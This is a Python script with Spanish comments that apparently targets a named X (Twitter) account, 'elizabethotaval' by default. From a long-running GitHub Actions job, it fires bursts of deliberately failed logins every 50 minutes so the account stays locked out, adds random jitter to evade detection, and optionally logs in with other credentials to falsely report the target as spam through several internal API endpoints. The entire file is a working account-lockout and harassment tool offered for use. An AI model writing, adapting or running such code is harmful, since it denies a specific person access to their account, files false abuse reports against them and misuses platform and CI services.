"""
Lockout continuo para una cuenta de X.
Disenado para correr dentro de un job de larga duracion de GitHub Actions.
Cada job vive MAX_JOB_MINUTOS y repite una rafaga de logins fallidos
cada INTERVALO_MINUTOS, de forma que la cuenta objetivo no pueda entrar.
"""

import asyncio
import os
import random
import time
from datetime import datetime, timezone

from twikit import Client

# ---------------------------- CONFIG ----------------------------
OBJETIVO            = os.environ.get("OBJETIVO", "elizabethotaval")
CONTRASENA_FALSA    = os.environ.get("CONTRASENA_FALSA", "noEsLaClave_2026!")
INTENTOS_POR_RAFAGA = int(os.environ.get("INTENTOS_POR_RAFAGA", "12"))
PAUSA_ENTRE_INTENTOS = float(os.environ.get("PAUSA_ENTRE_INTENTOS", "2"))

# Duracion de cada job (GitHub corta a 360 min; 350 deja margen).
MAX_JOB_MINUTOS  = float(os.environ.get("MAX_JOB_MINUTOS", "350"))
# Intervalo entre rafagas: 50 min < 1h para que el bloqueo nunca expire.
INTERVALO_MINUTOS = float(os.environ.get("INTERVALO_MINUTOS", "50"))
JITTER_SEGUNDOS   = 60  # desfase aleatorio para no ser robotico

# Reportes (opcional): si hay credenciales, reporta al inicio de cada job.
X_USER = os.environ.get("X_USER")
X_PASS = os.environ.get("X_PASS")
X_EMAIL = os.environ.get("X_EMAIL") or None
X_TOTP  = os.environ.get("X_TOTP") or None
HACER_REPORTE = bool(X_USER and X_PASS)
# ----------------------------------------------------------------


def log(msg):
    ahora = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    print(f"[{ahora}] {msg}", flush=True)


async def rafaga(objetivo):
    fallos = ok = 0
    for i in range(1, INTENTOS_POR_RAFAGA + 1):
        c = Client("en-US")
        try:
            await c.login(auth_info_1=objetivo, password=CONTRASENA_FALSA)
            ok += 1
            log(f"  intento {i}/{INTENTOS_POR_RAFAGA}: aceptado (raro)")
        except Exception as e:
            fallos += 1
            log(f"  intento {i}/{INTENTOS_POR_RAFAGA}: fallo ({type(e).__name__})")
        await asyncio.sleep(PAUSA_ENTRE_INTENTOS)
    log(f"  rafaga terminada: {fallos} fallos / {ok} aceptados")


REPORT_ENDPOINTS = [
    ("https://x.com/i/api/1.1/users/report_spam.json",
     lambda uid: {"params": {"user_id": uid, "perform_block": "false"}}),
    ("https://api.x.com/1.1/users/report_spam.json",
     lambda uid: {"params": {"user_id": uid, "perform_block": "false"}}),
    ("https://x.com/i/api/1.1/users/report.json",
     lambda uid: {"json": {"user_id": str(uid), "source": "profile", "reason": "spam"}}),
]


async def reportar(objetivo):
    log("Reportando la cuenta como spam...")
    c = Client("en-US")
    try:
        await c.login(auth_info_1=X_USER, auth_info_2=X_EMAIL,
                      password=X_PASS, totp_secret=X_TOTP)
    except Exception as e:
        log(f"  no se pudo loguear para reportar: {type(e).__name__}: {e}")
        return
    try:
        u = await c.get_user_by_screen_name(objetivo)
    except Exception as e:
        log(f"  no se encontro el usuario: {e}")
        return
    for url, build in REPORT_ENDPOINTS:
        try:
            r = await c.http.post(url, **build(u.id))
            log(f"  {url} -> HTTP {r.status_code}")
            if r.status_code in (200, 201, 204):
                return
        except Exception as e:
            log(f"  {url} -> {type(e).__name__}")


async def main():
    objetivo = OBJETIVO.strip().lstrip("@")
    log(f"=== INICIO | objetivo @{objetivo} | job max {MAX_JOB_MINUTOS:.0f} min ===")

    if HACER_REPORTE:
        try:
            await reportar(objetivo)
        except Exception as e:
            log(f"  reporte fallo: {e}")

    inicio = time.monotonic()
    ciclo = 0
    while (time.monotonic() - inicio) / 60 < MAX_JOB_MINUTOS:
        ciclo += 1
        log(f"--- Rafaga #{ciclo} ---")
        try:
            await rafaga(objetivo)
        except Exception as e:
            log(f"  error en rafaga: {type(e).__name__}: {e}")

        restante = MAX_JOB_MINUTOS - (time.monotonic() - inicio) / 60
        if restante <= 1:
            break
        dormir = min(INTERVALO_MINUTOS, restante - 0.5) * 60
        dormir += random.uniform(0, JITTER_SEGUNDOS)
        log(f"  durmiendo {dormir/60:.1f} min...")
        await asyncio.sleep(dormir)

    log(f"=== FIN | {ciclo} rafagas en {MAX_JOB_MINUTOS:.0f} min ===")


if __name__ == "__main__":
    asyncio.run(main())
